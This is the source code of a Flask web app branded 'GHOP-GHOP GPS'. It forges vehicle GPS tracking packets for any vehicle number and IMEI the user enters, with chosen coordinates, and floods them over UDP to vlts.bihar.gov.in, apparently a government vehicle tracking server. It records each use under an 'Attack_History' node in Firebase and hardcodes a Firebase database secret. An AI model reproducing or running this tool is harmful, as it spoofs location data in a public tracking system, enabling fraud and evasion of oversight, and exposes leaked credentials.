import os, socket, threading, time, requests, random
from datetime import datetime, timedelta, timezone
from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "nitro_v82_ultimate_final_locked_edition"

FB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com/"
FB_SECRET = "hpa10b2FOtP4nP5aYjtMWSoq3bdp1n5sbH6lPDjE"

TAG_LIST = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AIS140", "VLTD", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA"]

user_sessions = {}

def get_ist_time():
    return datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)

LOGIN_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - LOGIN</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .login-box { border: 2px solid #0f0; padding: 30px; border-radius: 15px; background: #050505; box-shadow: 0 0 20px #0f0; width: 300px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; text-align: center; font-weight: bold; }
        .btn { padding: 12px; width: 100%; background: #0f0; color: #000; border: none; font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>🫦 GHOP-GHOP GPS</h2>
        <form method="post">
            <input type="text" name="userid" placeholder="USER ID" required>
            <input type="password" name="password" placeholder="PASSWORD" required>
            <button class="btn">LOGIN</button>
        </form>
    </div>
</body>
</html>
"""

DASH_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>NITRO V82 - DASHBOARD</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 10px; display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; }
        .box { border: 2px solid #0f0; padding: 20px; border-radius: 15px; width: 100%; max-width: 480px; background: #050505; box-shadow: 0 0 20px #0f0; }
        .metric { font-size: 50px; color: #fff; margin: 10px 0; font-weight: bold; }
        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; text-align: left; }
        input { width: 94%; padding: 10px; background: #111; border: 1px solid #0f0; color: #0f0; border-radius: 5px; font-weight: bold; }
        .full { grid-column: span 2; }
        .btn { padding: 15px; font-size: 16px; cursor: pointer; border: none; border-radius: 8px; width: 100%; font-weight: bold; margin-top: 10px; text-transform: uppercase; }
        .start { background: #008000; color: #fff; }
        .stop { background: #800; color: #fff; }
        .preview { background: #111; color: yellow; padding: 12px; font-size: 11px; word-break: break-all; margin-top: 15px; border: 1px dashed #0f0; min-height: 60px; }
    </style>
</head>
<body>
    <div class="box">
        <form action="/logout" method="post"><button style="color:red; background:none; border:1px solid red; padding:5px; cursor:pointer; font-size:10px;">LOGOUT: {{user_id}}</button></form>
        <h2 style="margin-top:10px;">💋 GHOP-GHOP GPS 💋</h2>
        <div class="metric" id="cnt">0</div>
        <form action="/action" method="post" class="grid">
            <div class="full"><label>VEHICLE NO</label><input type="text" name="vno" id="vno" value="{{status.vno}}" oninput="this.value = this.value.toUpperCase();" onblur="checkVehicle()"></div>
            <div class="full"><label>IMEI</label><input type="text" name="imei" id="imei" value="{{status.imei}}"></div>
            <div><label>LATITUDE</label><input type="text" name="lat" id="lat" value="{{status.lat}}"></div>
            <div><label>LONGITUDE</label><input type="text" name="lon" id="lon" value="{{status.lon}}"></div>
            <div class="full"><label>📋 PACKET PREVIEW</label><div class="preview" id="preview">Ready...</div></div>
            <button class="btn start full" name="btn" value="start">🔥 START ENGINE</button>
            <button class="btn stop full" name="btn" value="stop">🛑 STOP ENGINE</button>
        </form>
        <hr style="border:1px solid #111; margin:15px 0;">
        <a href="/restore_my_data" style="color:yellow; text-decoration:none; font-size:11px; display:block; text-align:center;">🔄 CLICK HERE TO RESTORE 100+ VEHICLES DATA</a>
    </div>
    <script>
        async function checkVehicle() {
            let vno = document.getElementById('vno').value.toUpperCase(); if(!vno) return;
            let res = await fetch(`/check_vehicle?vno=${vno}`); let data = await res.json();
            if(data.imei) { document.getElementById('imei').value = data.imei; }
        }
        setInterval(() => {
            fetch('/data').then(r => r.json()).then(d => {
                document.getElementById('cnt').innerText = d.count;
                if(d.firing) document.getElementById('preview').innerText = d.last_pkt;
            });
        }, 1000);
    </script>
</body>
</html>
"""

def firing_engine(uid):
    target = ("vlts.bihar.gov.in", 9999)
    while uid in user_sessions and user_sessions[uid]["firing"]:
        try:
            s = user_sessions[uid]
            tag = TAG_LIST[s["count"] % len(TAG_LIST)]
            now = get_ist_time()
            pkt = f"$PVT,{tag},1.ONTC,NR,01,L,{s['imei']},{s['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{s['lat']},N,{s['lon']},E,0.0,348.79,31,0033.96,2.00,0.40,airtel,0,1,029.2,004.1,0,C,29,405,52,065d,45c2,45c1,065d,24,eeca,065d,17,bfd4,065d,17,384c,065d,16,0000,00,014722,A3270A39*"
            user_sessions[uid]["last_pkt"] = pkt
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(pkt.encode(), target)
            user_sessions[uid]["count"] += 1
            sock.close()
            time.sleep(0.02)
        except: time.sleep(1)

@app.route('/', methods=['GET', 'POST'])
def login():
    if 'user' in session: return redirect(url_for('dashboard'))
    if request.method == 'POST':
        uid, pw = request.form.get('userid').strip(), request.form.get('password').strip()
        data = requests.get(f"{FB_URL}/users/{uid}.json?auth={FB_SECRET}").json()
        if data and str(data.get('password')) == str(pw):
            session['user'] = uid
            user_sessions[uid] = {"firing": False, "count": 0, "imei": "", "vno": "", "lat": "25.298801", "lon": "84.651033", "last_pkt": "Ready..."}
            return redirect(url_for('dashboard'))
    return render_template_string(LOGIN_HTML)

@app.route('/dashboard')
def dashboard():
    uid = session.get('user')
    if not uid: return redirect(url_for('login'))
    return render_template_string(DASH_HTML, user_id=uid, status=user_sessions[uid])

@app.route('/action', methods=['POST'])
def action():
    uid = session.get('user')
    if not uid: return redirect(url_for('login'))
    val = request.form.get('btn')
    if val == "start":
        vno, imei = request.form.get('vno', '').strip().upper(), request.form.get('imei', '').strip()
        if vno and imei:
            user_sessions[uid].update({"firing": True, "vno": vno, "imei": imei, "lat": request.form.get('lat'), "lon": request.form.get('lon'), "count": 0})
            log_data = {"Vehicle_No": vno, "IMEI_No": imei, "Lat": user_sessions[uid]["lat"], "Lon": user_sessions[uid]["lon"], "Time": get_ist_time().strftime('%H:%M:%S')}
            requests.put(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}", json=log_data)
            requests.put(f"{FB_URL}/Attack_History/{get_ist_time().strftime('%Y-%m-%d')}/{uid}/{vno}.json?auth={FB_SECRET}", json=log_data)
            threading.Thread(target=firing_engine, args=(uid,), daemon=True).start()
    else: user_sessions[uid]["firing"] = False
    return redirect(url_for('dashboard'))

@app.route('/check_vehicle')
def check_vehicle():
    vno = request.args.get('vno', '').upper()
    data = requests.get(f"{FB_URL}/Data_Records/{vno}.json?auth={FB_SECRET}").json()
    return jsonify({"imei": data.get('IMEI_No')}) if data else jsonify({"imei": None})

@app.route('/data')
def data():
    uid = session.get('user')
    return jsonify(user_sessions.get(uid, {"count": 0, "firing": False}))

@app.route('/restore_my_data')
def restore_data():
    history = requests.get(f"{FB_URL}/Attack_History.json?auth={FB_SECRET}").json()
    count = 0
    if history:
        for date in history:
            for user in history[date]:
                for key in history[date][user]:
                    node = history[date][user][key]
                    if isinstance(node, dict) and "IMEI_No" not in node:
                        for time_node in node:
                            data = node[time_node]
                            if data.get('Vehicle_No') and data.get('IMEI_No'):
                                requests.put(f"{FB_URL}/Data_Records/{data['Vehicle_No']}.json?auth={FB_SECRET}", json=data)
                                count += 1
                    elif isinstance(node, dict) and node.get('Vehicle_No'):
                        requests.put(f"{FB_URL}/Data_Records/{node['Vehicle_No']}.json?auth={FB_SECRET}", json=node)
                        count += 1
    return f"Bhai, {count} vehicles restored! <a href='/dashboard'>Go Back</a>"

@app.route('/logout', methods=['POST'])
def logout(): session.clear(); return redirect(url_for('login'))

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
